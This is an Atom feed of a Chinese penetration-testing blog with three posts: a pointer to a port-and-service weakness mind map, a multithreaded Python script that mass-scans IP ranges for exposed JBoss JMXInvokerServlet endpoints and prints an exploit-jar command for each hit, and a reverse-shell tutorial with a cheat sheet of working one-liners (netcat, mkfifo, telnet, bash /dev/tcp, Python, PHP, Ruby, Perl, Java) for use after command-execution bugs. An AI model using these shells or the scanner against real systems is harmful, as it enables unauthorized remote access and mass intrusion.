<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[xkon's Blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://xkon.githb.io/"/>
  <updated>2015-10-14T03:53:01.000Z</updated>
  <id>http://xkon.githb.io/</id>
  
  <author>
    <name><![CDATA[xkon]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[常见端口服务及对应漏洞]]></title>
    <link href="http://xkon.githb.io/2015/09/15/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xkon.githb.io/2015/09/15/常见端口服务及常见漏洞/</id>
    <published>2015-09-15T13:25:51.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<h1 id="简述">简述</h1><p>本文总结了1-65535中常见端口对应的服务，以及对应服务比较容易出现的一些问题，并附有一些来自乌云的案例作为参考。</p>
<a id="more"></a>
<h1 id="脑图">脑图</h1><p>此处推荐一个百度的在线脑图制作工具——<a href="http://naotu.baidu.com" target="_blank" rel="external">百度脑图</a>，用着感觉不错</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/port-services-weakness-v1.png" alt=""></p>
<p>原始脑图文件地址，<a href="http://naotu.baidu.com/file/4e199a73587581ad475b09a7878645a5?token=53069d5292480ca2" target="_blank" rel="external">点我</a>.未完，待续。此为第一版，后续将持续更新。</p>
<h1 id="参考">参考</h1><p>主要参考了KCon 2015上的运营商安全那些事（可在Github上找到相应的PPT），还有很多WooYun的案例，及其他参考链接，在此一并感谢了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="简述">简述</h1><p>本文总结了1-65535中常见端口对应的服务，以及对应服务比较容易出现的一些问题，并附有一些来自乌云的案例作为参考。</p>]]>
    
    </summary>
    
      <category term="常见漏洞" scheme="http://xkon.githb.io/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="端口与服务" scheme="http://xkon.githb.io/tags/%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[多线程批量Jboss_JMXInvokerServlet探测脚本]]></title>
    <link href="http://xkon.githb.io/2015/09/10/Jboss-JMXInvokerServlet%E6%8E%A2%E6%B5%8B%E8%84%9A%E6%9C%AC/"/>
    <id>http://xkon.githb.io/2015/09/10/Jboss-JMXInvokerServlet探测脚本/</id>
    <published>2015-09-10T07:18:42.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<h1 id="JMXInvokerServlet简介">JMXInvokerServlet简介</h1><blockquote>
<p>JBoss allows for using adaptors for accessing MBean services over any supported protocols. For HTTP, the JBoss AS provides the HttpAdaptor. In a default installation, the HttpAdaptor is not activated. However, the HttpAdaptor’s JMX Invoker is running and publicly available at the URL <a href="http://localhost:8080/invoker/JMXInvokerServlet" target="_blank" rel="external">http://localhost:8080/invoker/JMXInvokerServlet</a>.<br>This Invoker accepts HTTP POST requests which contain a serialized JMX invocation in the data section (the objects belong to the JBoss AS Java class MarshalledInvocation). After deserialization the object is forwarded to the target MBean. Using this functionality an attacker can invoke the BSHDeployer MBean to create a local file and later call MainDeployer to deploy the locally created file.</p>
</blockquote>
<a id="more"></a>
<p>参考：<a href="https://acunetix.com/vulnerabilities/web/jboss-httpadaptor-jmxinvokerservlet" target="_blank" rel="external">JBoss HttpAdaptor JMXInvokerServlet</a></p>
<p>简单说就是Jboss 允许通过向/invoker/JMXInvokerServlet发送序列化后的JBoss对象，来部署war。如此我们就可以通过这个接口来部署我们的shell了。但是本文并不是来说这个漏洞的利用方法的，因为互联网上已经有很多文章介绍了利用方法，也有大牛制作了利用工具，metasploit里也有利用模块。本文是介绍怎么批量探测是否存在这个漏洞的。</p>
<h2 id="探测脚本">探测脚本</h2><p>首先只要能访问到网站的/invoker/JMXInvokerServlet就基本能确定其存在远程命令执行了，所以下面的脚本的探测原理也是这样的。上代码：</p>
<p><a href="https://gist.github.com/xkon/cf8084732d5ea70b3fb8" target="_blank" rel="external">gist点我</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8</span></span><br><span class="line"><span class="comment"># Jboss JMXInvokerServlet 批量探测脚本</span></span><br><span class="line"><span class="comment"># usage: ./invoker_assassin.py ipfile.lst</span></span><br><span class="line"><span class="comment"># ipfile.lst 中保存要批量探测的IP列表，支持CIDR方式</span></span><br><span class="line"><span class="comment"># 结果保存在result_vuls.lst中</span></span><br><span class="line"><span class="comment"># By xk0n 2015.09.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Lock, Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">assassin</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, ipfile, thread_num, ports, path)</span>:</span></span><br><span class="line">        self.ipfile = open(ipfile, <span class="string">'r'</span>)</span><br><span class="line">        self.thread_num = thread_num</span><br><span class="line">        self.ports = ports</span><br><span class="line">        self.vuls = set()</span><br><span class="line">        self.path = path</span><br><span class="line">        self.store_file = <span class="string">'result_vuls.lst'</span></span><br><span class="line">        self.lock = Lock()</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0"</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_urls</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> self.ipfile:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="keyword">for</span> ip <span class="keyword">in</span> ipaddress.ip_network(unicode(line), strict=<span class="keyword">False</span>):</span><br><span class="line">                <span class="keyword">for</span> port <span class="keyword">in</span> self.ports:</span><br><span class="line">                    <span class="keyword">if</span> port == <span class="number">80</span>:</span><br><span class="line">                        <span class="keyword">yield</span> <span class="string">'http://%s/%s'</span> % (ip, self.path)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">yield</span> <span class="string">'http://%s:%s/%s'</span> % (ip, port, self.path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        vul = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(</span><br><span class="line">                url, headers=self.headers, timeout=<span class="number">10</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">if</span> r.headers[<span class="string">'content-type'</span>].count(<span class="string">'serialized'</span>) <span class="keyword">or</span> r.headers[<span class="string">'Content-Type'</span>].count(<span class="string">'serialized'</span>):</span><br><span class="line">                    self.lock.acquire()</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'[+] maybe vul: %s'</span> % url</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'    poc: ./jboss_exploit_fat.jar -i %s get jboss.system:type=ServerInfo OSName'</span> % url</span><br><span class="line">                    self.vuls.add(url)</span><br><span class="line">                    self.lock.release()</span><br><span class="line">                    vul = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">return</span> vul</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> vul</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multi_assasin</span><span class="params">(self)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        uri = self._urls()</span><br><span class="line">        pool = ThreadPool(self.thread_num)</span><br><span class="line">        results = pool.map(self.run, uri)</span><br><span class="line">        pool.close()</span><br><span class="line">        pool.join()</span><br><span class="line">        <span class="keyword">with</span> open(self.store_file, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> self.vuls:</span><br><span class="line">                f.write(_+<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%s\ttotal vuln site: %s \n used %.2f minutes'</span> % (time.ctime(), len(self.vuls), (time.time()-start)/<span class="number">60.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ports = [<span class="number">80</span>, <span class="number">8080</span>, <span class="number">8081</span>, <span class="number">8082</span>, <span class="number">8088</span>, <span class="number">8888</span>]</span><br><span class="line">    thread_num = <span class="number">10</span></span><br><span class="line">    path = <span class="string">'invoker/JMXInvokerServlet'</span></span><br><span class="line">    <span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">        counts = <span class="number">0</span></span><br><span class="line">        port_count = len(ports)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> f:</span><br><span class="line">            index = <span class="number">32</span>-int(_.strip().split(<span class="string">'/'</span>)[<span class="number">1</span>]) <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> _ <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            counts += (<span class="number">2</span>**index)*port_count</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'%s\t\t %s ips| %s cases |%s threads'</span> % (time.ctime(), counts/port_count, counts, thread_num)</span><br><span class="line">    j = assassin(sys.argv[<span class="number">1</span>], thread_num, ports, path)</span><br><span class="line">    j.multi_assasin()</span><br></pre></td></tr></table></figure>
<p>首先，既然是批量探测就要考虑效率问题了，所以多线程是必须的，关于Python的多线程可以看看这篇<a href="http://segmentfault.com/a/1190000000414339" target="_blank" rel="external">一行 Python 实现并行化 – 日常多线程操作的新思路</a>，个人感觉不错。其次当探测对象非常多时，python的内存使用效率也是需要考虑的，所以这里用了<code>yield</code>而不是一下子就就把所有探测对象放入列表中，那样列表过大也会造成脚本自身的占用过大内存而造成问题。<code>yield</code>是不错的，值得玩python的去学一下。<br>最后是IP的问题，可以将一批你要探测的IP写入一个文件，每行一个，支持CIDR的方式。如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.2</span><span class="number">.3</span><span class="number">.4</span></span><br><span class="line"><span class="number">2.3</span><span class="number">.4</span><span class="number">.5</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<p>最后的最后，放张图吧：<br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/jmxinvokers_assasin_result.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="JMXInvokerServlet简介">JMXInvokerServlet简介</h1><blockquote>
<p>JBoss allows for using adaptors for accessing MBean services over any supported protocols. For HTTP, the JBoss AS provides the HttpAdaptor. In a default installation, the HttpAdaptor is not activated. However, the HttpAdaptor’s JMX Invoker is running and publicly available at the URL <a href="http://localhost:8080/invoker/JMXInvokerServlet">http://localhost:8080/invoker/JMXInvokerServlet</a>.<br>This Invoker accepts HTTP POST requests which contain a serialized JMX invocation in the data section (the objects belong to the JBoss AS Java class MarshalledInvocation). After deserialization the object is forwarded to the target MBean. Using this functionality an attacker can invoke the BSHDeployer MBean to create a local file and later call MainDeployer to deploy the locally created file.</p>
</blockquote>]]>
    
    </summary>
    
      <category term="JMXInvokerServlet" scheme="http://xkon.githb.io/tags/JMXInvokerServlet/"/>
    
      <category term="jboss" scheme="http://xkon.githb.io/tags/jboss/"/>
    
      <category term="python" scheme="http://xkon.githb.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux建立反向shell的几种方式]]></title>
    <link href="http://xkon.githb.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>http://xkon.githb.io/2015/09/04/Linux建立反向shell的几种方式/</id>
    <published>2015-09-04T12:12:19.000Z</published>
    <updated>2015-10-14T04:08:55.000Z</updated>
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>当我们运气好，碰上了一些命令执行的漏洞时，如：JDMP命令执行，struts2命令执行等，就可以通过反弹一个shell回来，继续渗透。此处收集了一些来源于网络的姿势，并有一些自己的解释及实践截图。</p>
<a id="more"></a>
<p>一些说明：</p>
<ul>
<li>首先需要在控制机上监听端口<br>方法：</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -l -<span class="tag">p</span> <span class="number">8090</span></span><br></pre></td></tr></table></figure>
<ul>
<li>下述测试PoC中需要替换的地方：<ul>
<li><code>&lt;target IP&gt;</code> 替换为自己的IP地址</li>
<li><code>&lt;port&gt;</code> 替换为自己监听的端口，只要不是被占用的都可以，如8090</li>
</ul>
</li>
</ul>
<h1 id="Netcat">Netcat</h1><p>nc是有好几个版本的<code>BSD</code>版的就不支持<code>-c</code> <code>-e</code>参数。</p>
<p>GNU版的有<code>-e</code>参数，则好办一些,直接如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="operator">-e</span> /bin/sh &lt;target IP&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>windows的<a href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" target="_blank" rel="external">nc</a>也是有<code>-e</code>参数的，故</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -e C:\WINDOWS\system32\<span class="built_in">cmd</span>.exe &lt;target IP&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>BSD版的要麻烦一些，但是也可以，如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span> | nc &lt;target IP&gt; &lt;port&gt; &gt;/tmp/bd</span><br></pre></td></tr></table></figure>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/ncbd.png" alt=""></p>
<p>解释一下：mkfifo 是创建一个先进先出的文件，然后整个流程是这样的：</p>
<ol>
<li>先在受害机器上创建了一个先进先出的文件bd</li>
<li>nc连接控制机，接受控制机的输入，传给bd这个文件</li>
<li>cat 将bd文件内容传给/bin/sh 执行</li>
<li><code>2&gt;&amp;1</code>是将stderr传给stdout，然后重定向给nc</li>
<li>nc通过网络将结果传给了控制机</li>
</ol>
<blockquote>
<p>其实这里的关键点还是管道命令和FIFO文件，管道命令使得命令平行执行，FIFO文件替代正常文件使读取等待，而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。</p>
</blockquote>
<p>除了mkfifo,mknod也有创建FIFO文件的功能，故PoC如下:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm p;mknod bd p;cat bd|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc  &lt;target IP&gt; &lt;port&gt; &gt;bd</span><br></pre></td></tr></table></figure>
<p>关于netcat的衍生：</p>
<ul>
<li>nmap出了一个ncat，装了nmap就会一起装上，功能比传统版本更多，也有<code>-e</code>参数</li>
<li>nc的加强版——socat</li>
</ul>
<h1 id="Telnet">Telnet</h1><p>其实telnet和nc基本是差不多的，只是nc在一些服务器上好像没有预装的，但是telnet一般都会有。</p>
<p>将上面BSD版nc的姿势中的nc换成telnet即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm bd;mkfifo bd;cat bd|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|telnet  &lt;target IP&gt; &lt;port&gt; &gt;bd</span><br></pre></td></tr></table></figure>
<p>mknod版</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm bd;mknod bd p;cat bd|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|telnet  &lt;target IP&gt; &lt;port&gt; &gt;bd</span><br></pre></td></tr></table></figure>
<p>此外还可以通过两个telnet 相连来构成一个reverse shell，PoC：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;target IP&gt; &lt;port1&gt; | /bin/sh |telnt &lt;target IP&gt; &lt;port2&gt;</span><br></pre></td></tr></table></figure>
<p>一个连接写，一个连接读，通过管道完美连接起来了！把telnet换成nc也是可行的。</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/ttt.png" alt=""></p>
<h1 id="Bash">Bash</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">"bash -i &amp;&gt;/dev/tcp/&lt;target IP&gt;/&lt;port&gt; 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/bashshell.png" alt=""></p>
<ul>
<li><code>-c</code>参数是将后面的字符串当做命令执行</li>
<li><code>-i</code>参数是得到一个交互式的shell</li>
<li><code>/dev/tcp/127.0.0.1/8899</code>建立tcp连接，其中的tcp也可换做udp</li>
<li><code>&amp;&gt;/dev/tcp/127.0.0.1/8899</code> 将stdout,stderr输出到socket文件；这里有人也用<code>&gt;&amp;</code>做stdout,stderr的重定向，两者是等价的</li>
<li><code>0&gt;&amp;1</code>是将stdin重定向，从stdout中取，也即从socket文件中取，也即从远端控制机的输入中取</li>
</ul>
<p>关于这里为什么需要<code>bash -c</code>,而直接执行会报错的原因，是因为在执行命令前bash先检查命令中的重定向的文件是否存在，不存在则建立，而socket文件的建立需要shell解释执行。在当前的shell下是不会去建立的，需要新建一个shell，<code>bash -c</code>主要就是这个作用了。也可以不用<code>bash -c</code>，可以将字符串中的内容写入脚本文件中，再执行也是可以的。这样理解或许有些困难，或者牵强，我也只是仅凭自己的已知识做出的判断，如有谬误，还望指出。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> <span class="number">9</span>&lt;&gt; /dev/tcp/localhost/<span class="number">8080</span>&amp;&amp;<span class="built_in">exec</span> <span class="number">0</span>&lt;&amp;<span class="number">9</span>&amp;&amp;<span class="built_in">exec</span> <span class="number">1</span>&gt;&amp;<span class="number">9</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>&amp;&amp;/bin/bash --noprofile –I</span><br></pre></td></tr></table></figure>
<p>上面这一条组合命令出自wzt的shell hacking，可以分成两部分看</p>
<ol>
<li><code>exec 9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec 0&lt;&amp;9&amp;&amp;exec 1&gt;&amp;9 2&gt;&amp;1</code></li>
<li><code>&amp;&amp;/bin/bash --noprofile –I</code></li>
</ol>
<p>第一部分中exec是一个内建命令，<code>exec 9&lt;&gt; /dev/tcp/localhost/8080</code>建立一个tcp连接并以9为fd来读写，<code>exec 0&lt;&amp;9&amp;&amp;exec 1&gt;&amp;9 2&gt;&amp;1</code>将stdin,stdout,stderr都和文件描述符9做绑定。这样标准输入输出错误都重定向到了socket中<br>第二部分开启一个bash子进程，继承了父进程的fd，也即将stdin,stdout,stderr都交给了socket连接，有控制机控制，得到一个交互shell。此处有一不得其解的地方，<code>-I</code>参数的作用是什么，在ubuntu 14.04 bash 4.3.11上也并没有这个参数，还望有人能指教。就算是<code>-i</code>测试时也会报错导致失败的</p>
<p>测试时将<code>-I</code>去除，并且也需要放入bash -c中，或者写入脚本文件再执行，结果：<br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/bashd.png" alt=""></p>
<h1 id="Python">Python</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;target ip&gt;",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
<ol>
<li>导入三个包socket,subprocess,os</li>
<li>实例化一个TCP socket为s</li>
<li>连接，此处需要更改为自己的IP和端口</li>
<li>os.dup2是复制文件描述符，将stdin,stdout,stderr都重定向到s这个连接</li>
<li>subprocess.call开启子进程,继承父进程的环境，包括文件描述符</li>
</ol>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/pybd.png" alt=""></p>
<h1 id="PHP">PHP</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("&lt;target ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<p>相较于python，php的确实短了很多，PHP是世界上最好的语言！-_-</p>
<ol>
<li>fsockopen建立一个tcp连接，一般会给他分配文件描述符3</li>
<li>任然是重定向与子进程的事情，不赘述</li>
</ol>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/phpbd.png" alt=""></p>
<h1 id="Ruby">Ruby</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket <span class="operator">-e</span><span class="string">'f=TCPSocket.open("&lt;target ip&gt;",&lt;port&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
<p>ruby不懂，不做解释了 ：\ 但是原理好像也是差不多的</p>
<h1 id="Perl">Perl</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl <span class="operator">-e</span> <span class="string">'use Socket;$i="&lt;target ip&gt;";$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
<p>未测试</p>
<h1 id="Java">Java</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<p>未测试</p>
<h1 id="Cheat_Sheet">Cheat Sheet</h1><p>下面弄个简短的备忘录,用时需要将<code>&lt;target ip&gt;</code>和<code>&lt;port&gt;</code> 换成自己的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#nc</span></span><br><span class="line">nc <span class="operator">-e</span> /bin/sh &lt;target IP&gt; &lt;port&gt;</span><br><span class="line">nc.exe <span class="operator">-e</span> C:\WINDOWS\system32\cmd.exe &lt;target IP&gt; &lt;port&gt;</span><br><span class="line">mkfifo bd;cat bd | /bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span> | nc &lt;target IP&gt; &lt;port&gt; &gt;bd</span><br><span class="line">mknod bd p;cat bd|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc  &lt;target IP&gt; &lt;port&gt; &gt;bd</span><br><span class="line"><span class="comment">#telnet</span></span><br><span class="line">mkfifo bd;cat bd|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|telnet  &lt;target IP&gt; &lt;port&gt; &gt;bd</span><br><span class="line">telnet &lt;target IP&gt; &lt;port1&gt; | /bin/sh |telnt &lt;target IP&gt; &lt;port2&gt;</span><br><span class="line"><span class="comment">#bash</span></span><br><span class="line">bash -c <span class="string">"bash -i &amp;&gt;/dev/tcp/&lt;target IP&gt;/&lt;port&gt; 0&gt;&amp;1"</span></span><br><span class="line">bash -c <span class="string">"exec 9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec 0&lt;&amp;9&amp;&amp;exec 1&gt;&amp;9 2&gt;&amp;1&amp;&amp;/bin/bash --noprofile"</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;target ip&gt;",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"><span class="comment">#perl</span></span><br><span class="line">perl <span class="operator">-e</span> <span class="string">'use Socket;$i="&lt;target ip&gt;";$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line"><span class="comment">#ruby</span></span><br><span class="line">ruby -rsocket <span class="operator">-e</span><span class="string">'f=TCPSocket.open("&lt;target ip&gt;",&lt;port&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
<h1 id="参考">参考</h1><p><a href="http://www.oschina.net/translate/linux-netcat-command" target="_blank" rel="external">LinuxNetcat命令：网络工具中的瑞士军刀</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><br><a href="https://github.com/knownsec/KCon/blob/master/KCon%202015/Shell%20Hacking.pdf" target="_blank" rel="external">wzt的shell hacking</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="前言">前言</h1><p>当我们运气好，碰上了一些命令执行的漏洞时，如：JDMP命令执行，struts2命令执行等，就可以通过反弹一个shell回来，继续渗透。此处收集了一些来源于网络的姿势，并有一些自己的解释及实践截图。</p>]]>
    
    </summary>
    
